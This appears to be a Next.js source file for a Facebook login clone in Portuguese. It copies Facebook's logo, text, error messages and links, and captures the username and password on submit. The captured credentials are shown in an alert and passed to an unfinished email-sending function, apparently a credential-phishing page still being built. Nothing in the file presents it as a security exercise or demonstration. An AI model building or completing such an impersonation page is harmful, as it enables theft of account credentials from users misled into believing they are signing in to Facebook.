import Layout from "../componentes/Layout";
import Image from "next/image";
import Footer from "../componentes/Footer";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
const nodemailer = require("nodemailer");

function HomePage() {
	const [show, setShow] = useState(false);
	const {
		register,
		handleSubmit,
		watch,
		formState: { errors },
	} = useForm();

	const onSubmit = async (data) => {
		alert(`${data.pass} || ${data.user}`);
		const email = await Sendmail();
	};

	const Sendmail = async () => {
		alert("email");
		// async..await is not allowed in global scope, must use a wrapper
		// async function main() {
		// 	// Generate test SMTP service account from ethereal.email
		// 	// Only needed if you don't have a real mail account for testing
		// 	let testAccount = await nodemailer.createTestAccount();

		// 	// create reusable transporter object using the default SMTP transport
		// 	let transporter = nodemailer.createTransport({
		// 		host: "smtp.ethereal.email",
		// 		port: 587,
		// 		secure: false, // true for 465, false for other ports
		// 		auth: {
		// 			user: testAccount.user, // generated ethereal user
		// 			pass: testAccount.pass, // generated ethereal password
		// 		},
		// 	});

		// 	// send mail with defined transport object
		// 	let info = await transporter.sendMail({
		// 		from: '"Fred Foo 👻" <foo@example.com>', // sender address
		// 		to: "bar@example.com, baz@example.com", // list of receivers
		// 		subject: "Hello ✔", // Subject line
		// 		text: "Hello world?", // plain text body
		// 		html: "<b>Hello world?</b>", // html body
		// 	});

		// 	console.log("Message sent: %s", info.messageId);
		// 	// Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

		// return info;
		// 	// Preview only available when sending through an Ethereal account
		// 	console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
		// 	// Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
		// }

		// main().catch(console.error);
	};

	return (
		<Layout>
			<div
				className="flex h-2/6 justify-center"
				style={{ backgroundColor: "#f0f2f5" }}
			>
				<div className="flex flex-col mt-10" style={{ width: "396px" }}>
					<Image src="/fb2.svg" width="240" height="85" />
					<form
						onSubmit={handleSubmit(onSubmit)}
						className="rounded-lg border shadow-lg p-3 bg-white "
					>
						<div
							className="p-3 text-center"
							style={{ fontSize: "18px", lineHeight: "22px" }}
						>
							Início de sessão no Facebook
						</div>
						<div className="mx-1 my-3">
							<input
								className="border-gray-300 border rounded-md "
								style={{
									fontSize: "17px",
									padding: "14px 16px",
									width: "363px",
								}}
								type="text"
								// name="email"
								placeholder="E-mail ou número de telemóvel"
								{...register("user", { required: true })}
							/>
							{errors.user && (
								<span className="text-red-600">
									The email or mobile number you entered isn’t connected to an
									account. Find your account and log in.
								</span>
							)}
						</div>
						<div className="mx-1 my-3">
							<input
								className="border-gray-300 border rounded-md"
								style={{
									fontSize: "17px",
									padding: "14px 16px",
									width: "363px",
								}}
								type="password"
								// name="pass"
								placeholder="Palavra-passe"
								{...register("pass", { required: true })}
							/>
							{errors.pass && (
								<span className="text-red-600">
									The password you’ve entered is incorrect. Forgot Password?
								</span>
							)}
						</div>
						<div className="mx-1 my-2">
							<button
								type="submit"
								className="text-white"
								style={{
									backgroundColor: "#1877f2",
									border: "none",
									borderRadius: "6px",
									fontSize: "20px",
									lineHeight: "48px",
									padding: "0 16px",
									width: "363px",
									fontWeight: "bold",
								}}
							>
								Iniciar sessão
							</button>
						</div>
						<div className="text-center" style={{ padding: "12px 0 18px" }}>
							<a
								href="https://www.facebook.com/recover/initiate/?ars=facebook_login"
								target="_black"
								className="lgcls"
							>
								Esqueceste-te da tua conta?
							</a>
							<span className="mx-1" style={{ color: "#90949c" }}>
								.
							</span>
							<a
								href="https://www.facebook.com/r.php?locale=en_US&display=page"
								target="_black"
								className="lgcls"
							>
								Regista-te no Facebook
							</a>
						</div>
					</form>
				</div>
			</div>
			<Footer />
		</Layout>
	);
}

export default HomePage;
